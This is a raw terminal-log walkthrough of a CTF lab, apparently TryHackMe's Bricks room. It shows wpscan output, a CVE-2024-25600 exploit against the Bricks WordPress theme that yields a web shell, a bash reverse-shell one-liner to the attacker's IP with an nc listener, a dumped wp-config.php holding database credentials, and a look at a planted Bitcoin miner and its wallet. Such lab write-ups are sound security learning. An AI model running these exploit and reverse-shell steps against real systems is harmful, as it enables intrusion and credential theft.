                                                                                                                                                                                                                                            
┌──(alvan㉿vbox)-[~/THM/bricks]
└─$ wpscan --url https://bricks.thm --disable-tls-checks
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: https://bricks.thm/ [10.10.215.136]
[+] Started: Fri Aug  8 18:29:23 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: server: Apache
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: https://bricks.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://bricks.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: https://bricks.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://bricks.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5 identified (Insecure, released on 2024-04-02).
 | Found By: Rss Generator (Passive Detection)
 |  - https://bricks.thm/feed/, <generator>https://wordpress.org/?v=6.5</generator>
 |  - https://bricks.thm/comments/feed/, <generator>https://wordpress.org/?v=6.5</generator>

[+] WordPress theme in use: bricks
 | Location: https://bricks.thm/wp-content/themes/bricks/
 | Readme: https://bricks.thm/wp-content/themes/bricks/readme.txt
 | Style URL: https://bricks.thm/wp-content/themes/bricks/style.css
 | Style Name: Bricks
 | Style URI: https://bricksbuilder.io/
 | Description: Visual website builder for WordPress....
 | Author: Bricks
 | Author URI: https://bricksbuilder.io/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.9.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://bricks.thm/wp-content/themes/bricks/style.css, Match: 'Version: 1.9.5'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:27 <=============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:27

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Aug  8 18:30:18 2025
[+] Requests Done: 170
[+] Cached Requests: 7
[+] Data Sent: 41.448 KB
[+] Data Received: 110.502 KB
[+] Memory used: 265.918 MB
[+] Elapsed time: 00:00:55


<img width="1910" height="766" alt="image" src="https://github.com/user-attachments/assets/f3969319-442e-4b9f-a633-307694ecdb60" />


┌──(alvan㉿vbox)-[~/THM/bricks]
└─$ python cve-2024-25600.py  
/home/alvan/THM/bricks/cve-2024-25600.py:20: SyntaxWarning: invalid escape sequence '\ '
  / ____/ |  / / ____/   |__ \ / __ \__ \/ // /      |__ \ / ____/ ___// __ \/ __ \\
Traceback (most recent call last):
  File "/home/alvan/THM/bricks/cve-2024-25600.py", line 13, in <module>
    from alive_progress import alive_bar
ModuleNotFoundError: No module named 'alive_progress'
                                                                                                                                                
┌──(alvan㉿vbox)-[~/THM/bricks]
└─$ pip install alive_progress   
error: externally-managed-environment

× This environment is externally managed
╰─> To install Python packages system-wide, try apt install
    python3-xyz, where xyz is the package you are trying to
    install.
    
    If you wish to install a non-Debian-packaged Python package,
    create a virtual environment using python3 -m venv path/to/venv.
    Then use path/to/venv/bin/python and path/to/venv/bin/pip. Make
    sure you have python3-full installed.
    
    If you wish to install a non-Debian packaged Python application,
    it may be easiest to use pipx install xyz, which will manage a
    virtual environment for you. Make sure you have pipx installed.
    
    See /usr/share/doc/python3.13/README.venv for more information.

note: If you believe this is a mistake, please contact your Python installation or OS distribution provider. You can override this, at the risk of breaking your Python installation or OS, by passing --break-system-packages.
hint: See PEP 668 for the detailed specification.
                                                                                                                                                
┌──(alvan㉿vbox)-[~/THM/bricks]
└─$ ls ../                             
CVE-2019-15107  Empire  bricks  hackervshacker  ice.md  myenv  soupedecode01.txt  wreath
                                                                                                                                                
┌──(alvan㉿vbox)-[~/THM/bricks]
└─$ source ../myenv/bin/activate  
                                                                                                                                                
┌──(myenv)─(alvan㉿vbox)-[~/THM/bricks]
└─$ pip install alive_progress
Collecting alive_progress
  Downloading alive_progress-3.3.0-py3-none-any.whl.metadata (72 kB)
Collecting about-time==4.2.1 (from alive_progress)
  Downloading about_time-4.2.1-py3-none-any.whl.metadata (13 kB)
Collecting graphemeu==0.7.2 (from alive_progress)
  Downloading graphemeu-0.7.2-py3-none-any.whl.metadata (7.8 kB)
Downloading alive_progress-3.3.0-py3-none-any.whl (78 kB)
Downloading about_time-4.2.1-py3-none-any.whl (13 kB)
Downloading graphemeu-0.7.2-py3-none-any.whl (22 kB)
Installing collected packages: graphemeu, about-time, alive_progress
Successfully installed about-time-4.2.1 alive_progress-3.3.0 graphemeu-0.7.2
                                                                                                                                                
┌──(myenv)─(alvan㉿vbox)-[~/THM/bricks]
└─$ python cve-2024-25600.py  
/home/alvan/THM/bricks/cve-2024-25600.py:20: SyntaxWarning: invalid escape sequence '\ '
  / ____/ |  / / ____/   |__ \ / __ \__ \/ // /      |__ \ / ____/ ___// __ \/ __ \\
Traceback (most recent call last):
  File "/home/alvan/THM/bricks/cve-2024-25600.py", line 4, in <module>
    import requests
ModuleNotFoundError: No module named 'requests'
                                                                                                                                                
┌──(myenv)─(alvan㉿vbox)-[~/THM/bricks]
└─$ pip install requests      
Collecting requests
  Downloading requests-2.32.4-py3-none-any.whl.metadata (4.9 kB)
Collecting charset_normalizer<4,>=2 (from requests)
  Downloading charset_normalizer-3.4.2-cp313-cp313-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (35 kB)
Requirement already satisfied: idna<4,>=2.5 in /home/alvan/THM/myenv/lib/python3.13/site-packages (from requests) (3.10)
Collecting urllib3<3,>=1.21.1 (from requests)
  Downloading urllib3-2.5.0-py3-none-any.whl.metadata (6.5 kB)
Collecting certifi>=2017.4.17 (from requests)
  Downloading certifi-2025.8.3-py3-none-any.whl.metadata (2.4 kB)
Downloading requests-2.32.4-py3-none-any.whl (64 kB)
Downloading charset_normalizer-3.4.2-cp313-cp313-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (148 kB)
Downloading urllib3-2.5.0-py3-none-any.whl (129 kB)
Downloading certifi-2025.8.3-py3-none-any.whl (161 kB)
Installing collected packages: urllib3, charset_normalizer, certifi, requests
Successfully installed certifi-2025.8.3 charset_normalizer-3.4.2 requests-2.32.4 urllib3-2.5.0
                                                                                                                                                
┌──(myenv)─(alvan㉿vbox)-[~/THM/bricks]
└─$ python cve-2024-25600.py
/home/alvan/THM/bricks/cve-2024-25600.py:20: SyntaxWarning: invalid escape sequence '\ '
  / ____/ |  / / ____/   |__ \ / __ \__ \/ // /      |__ \ / ____/ ___// __ \/ __ \\
Traceback (most recent call last):
  File "/home/alvan/THM/bricks/cve-2024-25600.py", line 7, in <module>
    from bs4 import BeautifulSoup
ModuleNotFoundError: No module named 'bs4'
                                                                                                                                                
┌──(myenv)─(alvan㉿vbox)-[~/THM/bricks]
└─$ pip install bs4           
Collecting bs4
  Downloading bs4-0.0.2-py2.py3-none-any.whl.metadata (411 bytes)
Collecting beautifulsoup4 (from bs4)
  Downloading beautifulsoup4-4.13.4-py3-none-any.whl.metadata (3.8 kB)
Collecting soupsieve>1.2 (from beautifulsoup4->bs4)
  Downloading soupsieve-2.7-py3-none-any.whl.metadata (4.6 kB)
Collecting typing-extensions>=4.0.0 (from beautifulsoup4->bs4)
  Downloading typing_extensions-4.14.1-py3-none-any.whl.metadata (3.0 kB)
Downloading bs4-0.0.2-py2.py3-none-any.whl (1.2 kB)
Downloading beautifulsoup4-4.13.4-py3-none-any.whl (187 kB)
Downloading soupsieve-2.7-py3-none-any.whl (36 kB)
Downloading typing_extensions-4.14.1-py3-none-any.whl (43 kB)
Installing collected packages: typing-extensions, soupsieve, beautifulsoup4, bs4
Successfully installed beautifulsoup4-4.13.4 bs4-0.0.2 soupsieve-2.7 typing-extensions-4.14.1
                                                                                                                                                
┌──(myenv)─(alvan㉿vbox)-[~/THM/bricks]
└─$ python cve-2024-25600.py -u https://bricks.thm/
/home/alvan/THM/bricks/cve-2024-25600.py:20: SyntaxWarning: invalid escape sequence '\ '
  / ____/ |  / / ____/   |__ \ / __ \__ \/ // /      |__ \ / ____/ ___// __ \/ __ \\
Traceback (most recent call last):
  File "/home/alvan/THM/bricks/cve-2024-25600.py", line 8, in <module>
    from rich.console import Console
ModuleNotFoundError: No module named 'rich'
                                                                                                                                                
┌──(myenv)─(alvan㉿vbox)-[~/THM/bricks]
└─$ pip install rich                               
Collecting rich
  Downloading rich-14.1.0-py3-none-any.whl.metadata (18 kB)
Collecting markdown-it-py>=2.2.0 (from rich)
  Downloading markdown_it_py-3.0.0-py3-none-any.whl.metadata (6.9 kB)
Collecting pygments<3.0.0,>=2.13.0 (from rich)
  Downloading pygments-2.19.2-py3-none-any.whl.metadata (2.5 kB)
Collecting mdurl~=0.1 (from markdown-it-py>=2.2.0->rich)
  Downloading mdurl-0.1.2-py3-none-any.whl.metadata (1.6 kB)
Downloading rich-14.1.0-py3-none-any.whl (243 kB)
Downloading pygments-2.19.2-py3-none-any.whl (1.2 MB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.2/1.2 MB 2.9 MB/s eta 0:00:00
Downloading markdown_it_py-3.0.0-py3-none-any.whl (87 kB)
Downloading mdurl-0.1.2-py3-none-any.whl (10.0 kB)
Installing collected packages: pygments, mdurl, markdown-it-py, rich
Successfully installed markdown-it-py-3.0.0 mdurl-0.1.2 pygments-2.19.2 rich-14.1.0
                                                                                                                                                
┌──(myenv)─(alvan㉿vbox)-[~/THM/bricks]
└─$ python cve-2024-25600.py -u https://bricks.thm/
/home/alvan/THM/bricks/cve-2024-25600.py:20: SyntaxWarning: invalid escape sequence '\ '
  / ____/ |  / / ____/   |__ \ / __ \__ \/ // /      |__ \ / ____/ ___// __ \/ __ \\
Traceback (most recent call last):
  File "/home/alvan/THM/bricks/cve-2024-25600.py", line 9, in <module>
    from prompt_toolkit import PromptSession, HTML
ModuleNotFoundError: No module named 'prompt_toolkit'
                                                                                                                                                
┌──(myenv)─(alvan㉿vbox)-[~/THM/bricks]
└─$ pip install prompt_toolkit                     
Collecting prompt_toolkit
  Downloading prompt_toolkit-3.0.51-py3-none-any.whl.metadata (6.4 kB)
Collecting wcwidth (from prompt_toolkit)
  Downloading wcwidth-0.2.13-py2.py3-none-any.whl.metadata (14 kB)
Downloading prompt_toolkit-3.0.51-py3-none-any.whl (387 kB)
Downloading wcwidth-0.2.13-py2.py3-none-any.whl (34 kB)
Installing collected packages: wcwidth, prompt_toolkit
Successfully installed prompt_toolkit-3.0.51 wcwidth-0.2.13
                                                                                                                                                
┌──(myenv)─(alvan㉿vbox)-[~/THM/bricks]
└─$ python cve-2024-25600.py -u https://bricks.thm/
/home/alvan/THM/bricks/cve-2024-25600.py:20: SyntaxWarning: invalid escape sequence '\ '
  / ____/ |  / / ____/   |__ \ / __ \__ \/ // /      |__ \ / ____/ ___// __ \/ __ \\

   _______    ________    ___   ____ ___  __ __       ___   ___________ ____  ____
  / ____/ |  / / ____/   |__ \ / __ \__ \/ // /      |__ \ / ____/ ___// __ \/ __ \
 / /    | | / / __/________/ // / / /_/ / // /_________/ //___ \/ __ \/ / / / / / /
/ /___  | |/ / /__/_____/ __// /_/ / __/__  __/_____/ __/____/ / /_/ / /_/ / /_/ /
\____/  |___/_____/    /____/\____/____/ /_/       /____/_____/\____/\____/\____/
    
Coded By: K3ysTr0K3R --> Hello, Friend!

[*] Checking if the target is vulnerable
[+] The target is vulnerable
[*] Initiating exploit against: https://bricks.thm/
[*] Initiating interactive shell
[+] Interactive shell opened successfully
Shell> ls
650c844110baced87e1606453b93f22a.txt
index.php
kod
license.txt
phpmyadmin
readme.html
wp-activate.php
wp-admin
wp-blog-header.php
wp-comments-post.php
wp-config-sample.php
wp-config.php
wp-content
wp-cron.php
wp-includes
wp-links-opml.php
wp-load.php
wp-login.php
wp-mail.php
wp-settings.php
wp-signup.php
wp-trackback.php
xmlrpc.php

Shell> cat 650c844110baced87e1606453b93f22a.txt
 
THM{fl46_650c844110baced87e1606453b93f22a}

Shell> bash -c 'exec bash -i &> /dev/tcp/10.4.124.126/4444 <&1'


└─$ nc -nvlp 4444                            
listening on [any] 4444 ...
connect to [10.4.124.126] from (UNKNOWN) [10.10.215.136] 46190
bash: cannot set terminal process group (1257): Inappropriate ioctl for device
bash: no job control in this shell
apache@tryhackme:/data/www/default$ ls
ls
650c844110baced87e1606453b93f22a.txt
index.php
kod
license.txt
phpmyadmin
readme.html
wp-activate.php
wp-admin
wp-blog-header.php
wp-comments-post.php
wp-config-sample.php
wp-config.php
wp-content
wp-cron.php
wp-includes
wp-links-opml.php
wp-load.php
wp-login.php
wp-mail.php
wp-settings.php
wp-signup.php
wp-trackback.php
xmlrpc.php
apache@tryhackme:/data/www/default$ cat wp-config.php
cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'root' );

/** Database password */
define( 'DB_PASSWORD', 'lamp.sh' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '?HI~$7a0sn[(C=+kmx=JDV63[]sOnqKx|G51mk5f$igT~/NjljMgA#L dR]YUa z' );
define( 'SECURE_AUTH_KEY',  'VHqhArawbk GIa?/yw@5wKL8^n;X#1[~dx7ip/8d,CTMoowa7I>D>t]%,@V+Dff8' );
define( 'LOGGED_IN_KEY',    'N~l1*HAb~|6UV;]pkI./Tu11Z8$}1a{ZH0p2.z%221w]{vj<g?ELvb+qgWp u>r6' );
define( 'NONCE_KEY',        'Wu/sg/)nHQJ|sggXMb(@<,;NCc[AcMlL!5}p_N;fqmr-$Tt1Ex6x:(%T{{Ht&!Re' );
define( 'AUTH_SALT',        'zi$l=XQKDA0hF8Q4c(2]o_kU:!lz?;xuQkU3zB#8DnLZ6CUW:HX@%0FsG6=IRSZE' );
define( 'SECURE_AUTH_SALT', 'tiycIlY-:(Y)6I ayw2t/<#<RWUm6/,DsbY*;!ykNtT!B4|YM&($ u2X)mi.`r8z' );
define( 'LOGGED_IN_SALT',   '(kn%uPE>Up5}ehVO~}qG>]zfHO`oE[vdXzLi.N{)UlKcQ]cr/Vy*yisutrsJZ<&T' );
define( 'NONCE_SALT',       '6rzz2K[ztP}6KM ?5,c2S&)M!y;.}b6M/g{iOzO|sy;0.ePu ><z[v_0aHh$HD%}' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
apache@tryhackme:/data/www/default$ pwd
pwd
/data/www/default
apache@tryhackme:/data/www/default$ ls
ls
650c844110baced87e1606453b93f22a.txt
index.php
kod
license.txt
phpmyadmin
readme.html
wp-activate.php
wp-admin
wp-blog-header.php
wp-comments-post.php
wp-config-sample.php
wp-config.php
wp-content
wp-cron.php
wp-includes
wp-links-opml.php
wp-load.php
wp-login.php
wp-mail.php
wp-settings.php
wp-signup.php
wp-trackback.php
xmlrpc.php
apache@tryhackme:/data/www/default$ systemctl cat ubuntu.service
systemctl cat ubuntu.service
# /etc/systemd/system/ubuntu.service
[Unit]
Description=TRYHACK3M

[Service]
Type=simple
ExecStart=/lib/NetworkManager/nm-inet-dialog
Restart=on-failure

[Install]
WantedBy=multi-user.target
apache@tryhackme:/data/www/default$ 
cd /lib/NetworkManager
ls
cat inet.conf

2024-04-11 10:53:58,574 [*] Miner()
2024-04-11 10:54:00,576 [*] Miner()
2024-04-11 10:54:02,579 [*] Miner()
apache@tryhackme:/lib/NetworkManager$ head inet.conf
head inet.conf
ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
2024-04-08 10:46:04,743 [*] confbak: Ready!
2024-04-08 10:46:04,743 [*] Status: Mining!
2024-04-08 10:46:08,745 [*] Miner()
2024-04-08 10:46:08,745 [*] Bitcoin Miner Thread Started
2024-04-08 10:46:08,745 [*] Status: Mining!
2024-04-08 10:46:10,747 [*] Miner()
2024-04-08 10:46:12,748 [*] Miner()
2024-04-08 10:46:14,751 [*] Miner()
2024-04-08 10:46:16,753 [*] Miner()
apache@tryhackme:/lib/NetworkManager$ 

cyberchef.io
from hex from base64 frombase64
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
bc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa

<img width="1004" height="556" alt="image" src="https://github.com/user-attachments/assets/c1031114-f3ad-4dfb-8ac9-e2f37a96482e" />

<img width="657" height="655" alt="image" src="https://github.com/user-attachments/assets/bdd7b595-146c-4d9a-948d-68a2d1900019" />



